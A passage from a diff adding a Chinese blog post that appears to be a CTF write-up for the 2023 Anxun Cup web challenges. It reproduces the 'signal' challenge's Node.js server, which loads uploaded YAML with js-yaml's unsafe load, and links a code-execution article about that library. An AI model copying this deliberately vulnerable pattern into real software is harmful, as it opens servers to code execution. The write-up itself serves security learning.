@@ -1,0 +1,1446 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Zer0peach">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="2023安洵杯第六届网络安全挑战赛-web前言web：2&#x2F;6   只会做最简单的(wuwuwuw，已经废了) 标记*为做出的  signalnodeca&#x2F;js-yaml: JavaScript YAML parser and dumper. Very fast. (github.com) Code Execution via YAML in JS-YAML Node.js Mo">
+<meta property="og:type" content="article">
+<meta property="og:title" content="安洵杯校园赛2023">
+<meta property="og:url" content="https://zer0peach.github.io/2023/12/24/%E5%AE%89%E6%B4%B5%E6%9D%AF%E6%A0%A1%E5%9B%AD%E8%B5%9B2023/index.html">
+<meta property="og:site_name" content="Zer0peach can&#39;t think">
+<meta property="og:description" content="2023安洵杯第六届网络安全挑战赛-web前言web：2&#x2F;6   只会做最简单的(wuwuwuw，已经废了) 标记*为做出的  signalnodeca&#x2F;js-yaml: JavaScript YAML parser and dumper. Very fast. (github.com) Code Execution via YAML in JS-YAML Node.js Mo">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://zer0peach.github.io/images/%E5%AE%89%E6%B4%B5%E6%9D%AF%E6%A0%A1%E5%9B%AD%E8%B5%9B2023/image-20231225135621158.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/%E5%AE%89%E6%B4%B5%E6%9D%AF%E6%A0%A1%E5%9B%AD%E8%B5%9B2023/image-20231225143227242.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/%E5%AE%89%E6%B4%B5%E6%9D%AF%E6%A0%A1%E5%9B%AD%E8%B5%9B2023/image-20231225144028049.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/%E5%AE%89%E6%B4%B5%E6%9D%AF%E6%A0%A1%E5%9B%AD%E8%B5%9B2023/image-20231225144401766.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/%E5%AE%89%E6%B4%B5%E6%9D%AF%E6%A0%A1%E5%9B%AD%E8%B5%9B2023/image-20231225153202302.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/%E5%AE%89%E6%B4%B5%E6%9D%AF%E6%A0%A1%E5%9B%AD%E8%B5%9B2023/image-20231225160010951.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/%E5%AE%89%E6%B4%B5%E6%9D%AF%E6%A0%A1%E5%9B%AD%E8%B5%9B2023/image-20231225160032682.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/%E5%AE%89%E6%B4%B5%E6%9D%AF%E6%A0%A1%E5%9B%AD%E8%B5%9B2023/image-20231225160716321.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/%E5%AE%89%E6%B4%B5%E6%9D%AF%E6%A0%A1%E5%9B%AD%E8%B5%9B2023/image-20231225160502576.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/%E5%AE%89%E6%B4%B5%E6%9D%AF%E6%A0%A1%E5%9B%AD%E8%B5%9B2023/image-20231225160531450.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/%E5%AE%89%E6%B4%B5%E6%9D%AF%E6%A0%A1%E5%9B%AD%E8%B5%9B2023/image-20231225161651950.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/%E5%AE%89%E6%B4%B5%E6%9D%AF%E6%A0%A1%E5%9B%AD%E8%B5%9B2023/image-20231226231442673.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/%E5%AE%89%E6%B4%B5%E6%9D%AF%E6%A0%A1%E5%9B%AD%E8%B5%9B2023/image-20231225172848202.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/%E5%AE%89%E6%B4%B5%E6%9D%AF%E6%A0%A1%E5%9B%AD%E8%B5%9B2023/image-20231225173022808.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/%E5%AE%89%E6%B4%B5%E6%9D%AF%E6%A0%A1%E5%9B%AD%E8%B5%9B2023/image-20231225173116722.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/%E5%AE%89%E6%B4%B5%E6%9D%AF%E6%A0%A1%E5%9B%AD%E8%B5%9B2023/image-20231225173148534.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/%E5%AE%89%E6%B4%B5%E6%9D%AF%E6%A0%A1%E5%9B%AD%E8%B5%9B2023/image-20231226104947897.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/%E5%AE%89%E6%B4%B5%E6%9D%AF%E6%A0%A1%E5%9B%AD%E8%B5%9B2023/image-20231226105035662.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/%E5%AE%89%E6%B4%B5%E6%9D%AF%E6%A0%A1%E5%9B%AD%E8%B5%9B2023/image-20231226105133981.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/%E5%AE%89%E6%B4%B5%E6%9D%AF%E6%A0%A1%E5%9B%AD%E8%B5%9B2023/image-20231226105150232.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/%E5%AE%89%E6%B4%B5%E6%9D%AF%E6%A0%A1%E5%9B%AD%E8%B5%9B2023/image-20231226105035662.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/%E5%AE%89%E6%B4%B5%E6%9D%AF%E6%A0%A1%E5%9B%AD%E8%B5%9B2023/image-20231226113132550.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/%E5%AE%89%E6%B4%B5%E6%9D%AF%E6%A0%A1%E5%9B%AD%E8%B5%9B2023/image-20231226113437650.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/%E5%AE%89%E6%B4%B5%E6%9D%AF%E6%A0%A1%E5%9B%AD%E8%B5%9B2023/image-20231226113555944.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/%E5%AE%89%E6%B4%B5%E6%9D%AF%E6%A0%A1%E5%9B%AD%E8%B5%9B2023/image-20231226114031067.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/%E5%AE%89%E6%B4%B5%E6%9D%AF%E6%A0%A1%E5%9B%AD%E8%B5%9B2023/image-20231226163620650.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/%E5%AE%89%E6%B4%B5%E6%9D%AF%E6%A0%A1%E5%9B%AD%E8%B5%9B2023/image-20231226163843117.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/%E5%AE%89%E6%B4%B5%E6%9D%AF%E6%A0%A1%E5%9B%AD%E8%B5%9B2023/image-20231226170004784.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/%E5%AE%89%E6%B4%B5%E6%9D%AF%E6%A0%A1%E5%9B%AD%E8%B5%9B2023/image-20231226170040751.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/%E5%AE%89%E6%B4%B5%E6%9D%AF%E6%A0%A1%E5%9B%AD%E8%B5%9B2023/image-20231226192143635.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/%E5%AE%89%E6%B4%B5%E6%9D%AF%E6%A0%A1%E5%9B%AD%E8%B5%9B2023/image-20231226192210514.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/%E5%AE%89%E6%B4%B5%E6%9D%AF%E6%A0%A1%E5%9B%AD%E8%B5%9B2023/image-20231226192244047.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/%E5%AE%89%E6%B4%B5%E6%9D%AF%E6%A0%A1%E5%9B%AD%E8%B5%9B2023/image-20231226192346781.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/%E5%AE%89%E6%B4%B5%E6%9D%AF%E6%A0%A1%E5%9B%AD%E8%B5%9B2023/image-20231226192846004.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/%E5%AE%89%E6%B4%B5%E6%9D%AF%E6%A0%A1%E5%9B%AD%E8%B5%9B2023/image-20231226192951705.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/%E5%AE%89%E6%B4%B5%E6%9D%AF%E6%A0%A1%E5%9B%AD%E8%B5%9B2023/image-20231226193514249.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/%E5%AE%89%E6%B4%B5%E6%9D%AF%E6%A0%A1%E5%9B%AD%E8%B5%9B2023/image-20231226193719022.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/%E5%AE%89%E6%B4%B5%E6%9D%AF%E6%A0%A1%E5%9B%AD%E8%B5%9B2023/image-20231226193741884.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/%E5%AE%89%E6%B4%B5%E6%9D%AF%E6%A0%A1%E5%9B%AD%E8%B5%9B2023/image-20231226230750413.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/%E5%AE%89%E6%B4%B5%E6%9D%AF%E6%A0%A1%E5%9B%AD%E8%B5%9B2023/image-20231226230829491.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/%E5%AE%89%E6%B4%B5%E6%9D%AF%E6%A0%A1%E5%9B%AD%E8%B5%9B2023/image-20231226230923364.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/%E5%AE%89%E6%B4%B5%E6%9D%AF%E6%A0%A1%E5%9B%AD%E8%B5%9B2023/image-20231226230717560.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/%E5%AE%89%E6%B4%B5%E6%9D%AF%E6%A0%A1%E5%9B%AD%E8%B5%9B2023/image-20231226194748123.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/%E5%AE%89%E6%B4%B5%E6%9D%AF%E6%A0%A1%E5%9B%AD%E8%B5%9B2023/image-20231226195221950.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/%E5%AE%89%E6%B4%B5%E6%9D%AF%E6%A0%A1%E5%9B%AD%E8%B5%9B2023/image-20231226234244580.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/%E5%AE%89%E6%B4%B5%E6%9D%AF%E6%A0%A1%E5%9B%AD%E8%B5%9B2023/image-20231226234721487.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/%E5%AE%89%E6%B4%B5%E6%9D%AF%E6%A0%A1%E5%9B%AD%E8%B5%9B2023/image-20231226235550655.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/%E5%AE%89%E6%B4%B5%E6%9D%AF%E6%A0%A1%E5%9B%AD%E8%B5%9B2023/image-20231226235051453.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/%E5%AE%89%E6%B4%B5%E6%9D%AF%E6%A0%A1%E5%9B%AD%E8%B5%9B2023/image-20231226235119574.png">
+<meta property="article:published_time" content="2023-12-24T04:40:44.000Z">
+<meta property="article:modified_time" content="2023-12-26T15:56:35.888Z">
+<meta property="article:author" content="Zer0peach">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://zer0peach.github.io/images/%E5%AE%89%E6%B4%B5%E6%9D%AF%E6%A0%A1%E5%9B%AD%E8%B5%9B2023/image-20231225135621158.png">
+  
+  
+  
+  <title>安洵杯校园赛2023 - Zer0peach can&#39;t think</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"zer0peach.github.io","root":"/","version":"1.9.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":true,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Zer0peach&#39;s Blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="安洵杯校园赛2023"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-12-24 12:40" pubdate>
+          2023年12月24日 下午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          22k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          187 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">安洵杯校园赛2023</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="2023安洵杯第六届网络安全挑战赛-web"><a href="#2023安洵杯第六届网络安全挑战赛-web" class="headerlink" title="2023安洵杯第六届网络安全挑战赛-web"></a>2023安洵杯第六届网络安全挑战赛-web</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>web：2&#x2F;6   只会做最简单的(wuwuwuw，已经废了) 标记<code>*</code>为做出的</p>
+<p><img src="/../images/%E5%AE%89%E6%B4%B5%E6%9D%AF%E6%A0%A1%E5%9B%AD%E8%B5%9B2023/image-20231225135621158.png" srcset="/img/loading.gif" lazyload alt="image-20231225135621158"></p>
+<h2 id="signal"><a href="#signal" class="headerlink" title="signal"></a>signal</h2><p><a target="_blank" rel="noopener" href="https://github.com/nodeca/js-yaml">nodeca&#x2F;js-yaml: JavaScript YAML parser and dumper. Very fast. (github.com)</a></p>
+<p><a target="_blank" rel="noopener" href="https://nealpoole.com/blog/2013/06/code-execution-via-yaml-in-js-yaml-nodejs-module/">Code Execution via YAML in JS-YAML Node.js Module » Neal Poole</a></p>
+<p>可能是关键词不对，刚开始搜<code>nodejs yaml漏洞</code>出来的全是nodejs有关的，结束后看下wp，是<code>js-yaml</code>，然后搜<code>js-yaml</code>漏洞，直接就搜到了。。。。。</p>
+<p>sb了，复现时看了下package.json，发现是有js-yaml的，当时没注意，也算是技不如人吧</p>
+<p>以后nodejs的题先对着package.json的版本搜漏洞，我看看哪个库能逃掉</p>
+<p>照着官方wp的顺序走一遍吧</p>
+<div class="code-wrapper"><pre><code class="hljs js"><span class="hljs-keyword">const</span> express = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;express&#x27;</span>);
+<span class="hljs-keyword">const</span> multer = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;multer&#x27;</span>);
+<span class="hljs-keyword">const</span> bodyParser = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;body-parser&#x27;</span>);
+<span class="hljs-keyword">const</span> ini = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;iniparser&#x27;</span>);
+<span class="hljs-keyword">const</span> xml2js = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;xml2js&#x27;</span>);
+<span class="hljs-keyword">const</span> properties = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;properties&#x27;</span>);
+<span class="hljs-keyword">const</span> yaml = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;js-yaml&#x27;</span>);
+<span class="hljs-keyword">const</span> cp = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;child_process&#x27;</span>)
+<span class="hljs-keyword">const</span> path = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;path&#x27;</span>);
+<span class="hljs-keyword">const</span> session = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;express-session&#x27;</span>);
+
+<span class="hljs-keyword">const</span> app = <span class="hljs-title function_">express</span>();
+<span class="hljs-keyword">const</span> port = process.<span class="hljs-property">env</span>.<span class="hljs-property">PORT</span> || <span class="hljs-number">80</span>;
+
+<span class="hljs-comment">// 设置存储配置</span>
+<span class="hljs-keyword">const</span> storage = multer.<span class="hljs-title function_">memoryStorage</span>();
+<span class="hljs-keyword">const</span> upload = <span class="hljs-title function_">multer</span>(&#123; <span class="hljs-attr">storage</span>: storage &#125;);
+
+
+app.<span class="hljs-title function_">use</span>(express.<span class="hljs-title function_">static</span>(path.<span class="hljs-title function_">join</span>(__dirname, <span class="hljs-string">&#x27;public&#x27;</span>)));
+app.<span class="hljs-title function_">set</span>(<span class="hljs-string">&#x27;views&#x27;</span>, path.<span class="hljs-title function_">join</span>(__dirname, <span class="hljs-string">&#x27;views&#x27;</span>));
+app.<span class="hljs-title function_">set</span>(<span class="hljs-string">&#x27;view engine&#x27;</span>, <span class="hljs-string">&#x27;ejs&#x27;</span>);
+
+app.<span class="hljs-title function_">use</span>(<span class="hljs-title function_">session</span>(&#123;
+	<span class="hljs-attr">secret</span>: <span class="hljs-string">&#x27;welcome&#x27;</span>,<span class="hljs-comment">//</span>
+	<span class="hljs-attr">resave</span>: <span class="hljs-literal">false</span>,
+	<span class="hljs-attr">saveUninitialized</span>: <span class="hljs-literal">false</span>,
+	<span class="hljs-attr">cookie</span>: &#123;
+		<span class="hljs-attr">maxAge</span>: <span class="hljs-number">3600000</span>
+	&#125;
+&#125;))
+
+<span class="hljs-keyword">let</span> output = <span class="hljs-string">&#x27;&#x27;</span>;
+
+app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;
+	res.<span class="hljs-title function_">sendFile</span>(path.<span class="hljs-title function_">join</span>(__dirname, <span class="hljs-string">&#x27;public&#x27;</span>, <span class="hljs-string">&#x27;index.html&#x27;</span>));
+&#125;);
+
+app.<span class="hljs-title function_">post</span>(<span class="hljs-string">&#x27;/convert&#x27;</span>, upload.<span class="hljs-title function_">single</span>(<span class="hljs-string">&#x27;configFile&#x27;</span>), <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;
+	<span class="hljs-keyword">if</span> (!req.<span class="hljs-property">file</span>) &#123;
+		<span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">400</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;No file uploaded.&#x27;</span>);
+	&#125;
+	<span class="hljs-keyword">if</span>(req.<span class="hljs-property">body</span>.<span class="hljs-property">format</span>!=<span class="hljs-string">&quot;yaml&quot;</span>)&#123;
+		<span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">404</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">&quot;该功能暂未开始使用.&quot;</span>);
+	&#125;
+	<span class="hljs-keyword">const</span> fileExtension = path.<span class="hljs-title function_">extname</span>(req.<span class="hljs-property">file</span>.<span class="hljs-property">originalname</span>).<span class="hljs-title function_">toLowerCase</span>();
+	<span class="hljs-keyword">const</span> fileBuffer = req.<span class="hljs-property">file</span>.<span class="hljs-property">buffer</span>.<span class="hljs-title function_">toString</span>(<span class="hljs-string">&#x27;utf8&#x27;</span>);
+
+
+	<span class="hljs-keyword">if</span> (fileExtension === <span class="hljs-string">&#x27;.ini&#x27;</span>) &#123;
+		<span class="hljs-comment">// 处理 INI 文件</span>
+		<span class="hljs-keyword">const</span> parsedData = ini.<span class="hljs-title function_">parseString</span>(fileBuffer);
+		output = yaml.<span class="hljs-title function_">dump</span>(parsedData);
+	&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (fileExtension === <span class="hljs-string">&#x27;.xml&#x27;</span>) &#123;
+		<span class="hljs-comment">// 处理 XML 文件</span>
+		xml2js.<span class="hljs-title function_">parseString</span>(fileBuffer, <span class="hljs-function">(<span class="hljs-params">err, result</span>) =&gt;</span> &#123;
+			<span class="hljs-keyword">if</span> (err) &#123;
+				<span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">500</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;Error parsing XML.&#x27;</span>);
+			&#125;
+			output = yaml.<span class="hljs-title function_">dump</span>(result);
+		&#125;);
+	&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (fileExtension === <span class="hljs-string">&#x27;.properties&#x27;</span>) &#123;
+		<span class="hljs-comment">// 处理 Properties 文件</span>
+		properties.<span class="hljs-title function_">parse</span>(fileBuffer, <span class="hljs-function">(<span class="hljs-params">err, parsedData</span>) =&gt;</span> &#123;
+			<span class="hljs-keyword">if</span> (err) &#123;
+				<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">&#x27;Error parsing properties file:&#x27;</span>, err);
+				<span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">500</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;Error parsing properties file.&#x27;</span>);
+			&#125;
+			output = yaml.<span class="hljs-title function_">dump</span>(parsedData);
+		&#125;);
+	&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (fileExtension === <span class="hljs-string">&#x27;.yaml&#x27;</span>) &#123;
+		<span class="hljs-comment">// 处理 YAML 文件</span>
+		<span class="hljs-keyword">try</span> &#123;
+			<span class="hljs-comment">// 尝试解析 YAML 文件</span>
+			<span class="hljs-keyword">const</span> yamlData = yaml.<span class="hljs-title function_">load</span>(fileBuffer);
+			<span class="hljs-comment">// 如果成功解析，yamlData 变量将包含 YAML 文件的内容</span>
+			output = yaml.<span class="hljs-title function_">dump</span>(yamlData);
+		&#125; <span class="hljs-keyword">catch</span> (e) &#123;
+			<span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">400</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;Invalid YAML format: &#x27;</span> + e.<span class="hljs-property">message</span>);
+		&#125;
+	&#125;
+
+	<span class="hljs-keyword">if</span> (output) &#123;
+		<span class="hljs-keyword">let</span> name = <span class="hljs-string">&#x27;ctfer&#x27;</span>;
+		<span class="hljs-keyword">const</span> yamlData = yaml.<span class="hljs-title function_">load</span>(output);
+		<span class="hljs-keyword">if</span> (yamlData &amp;&amp; yamlData.<span class="hljs-property">name</span>) &#123;
+			 name = yamlData.<span class="hljs-property">name</span>;
+		&#125;
+		req.<span class="hljs-property">session</span>.<span class="hljs-property">outputData</span>=name;
+		req.<span class="hljs-property">session</span>.<span class="hljs-property">outputData</span>=output;
+		res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;preview&#x27;</span>, &#123; <span class="hljs-attr">name</span>: name,<span class="hljs-attr">output</span>: output &#125;); <span class="hljs-comment">// 渲染 preview.ejs 模板</span>
+	&#125; <span class="hljs-keyword">else</span> &#123;
+		res.<span class="hljs-title function_">status</span>(<span class="hljs-number">400</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;Unsupported format.&#x27;</span>)
+	&#125;
+&#125;);
+app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/download&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;
+	<span class="hljs-keyword">if</span> (output) &#123;
+		<span class="hljs-keyword">const</span> outputData = req.<span class="hljs-property">session</span>.<span class="hljs-property">outputData</span>;
+
+		<span class="hljs-comment">// 设置响应头，指定文件的内容类型为YAML</span>
+		res.<span class="hljs-title function_">setHeader</span>(<span class="hljs-string">&#x27;Content-Type&#x27;</span>, <span class="hljs-string">&#x27;application/x-yaml&#x27;</span>);
+		<span class="hljs-comment">// 设置响应头，指定文件名</span>
+		res.<span class="hljs-title function_">setHeader</span>(<span class="hljs-string">&#x27;Content-Disposition&#x27;</span>, <span class="hljs-string">&#x27;attachment; filename=&quot;output.yaml&quot;&#x27;</span>);
+
+		<span class="hljs-comment">// 将转换后的文件内容发送给客户端</span>
+		res.<span class="hljs-title function_">send</span>(outputData);
+	&#125; <span class="hljs-keyword">else</span> &#123;
+		res.<span class="hljs-title function_">status</span>(<span class="hljs-number">404</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;File not found.&#x27;</span>);
+	&#125;
+&#125;);
+app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/flag&#x27;</span>,<span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;
+	<span class="hljs-keyword">if</span>(req.<span class="hljs-property">session</span>.<span class="hljs-property">name</span>==<span class="hljs-string">&#x27;admin&#x27;</span>)&#123;
+		cp.<span class="hljs-title function_">execFile</span>(<span class="hljs-string">&#x27;/readflag&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">err, stdout, stderr</span>) =&gt;</span> &#123;
+			<span class="hljs-keyword">if</span> (err) &#123;
+				<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">&#x27;Error:&#x27;</span>, err);
+				<span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">404</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;File not found.&#x27;</span>);
+			&#125;
+			res.<span class="hljs-title function_">send</span>(stdout);
+		&#125;)
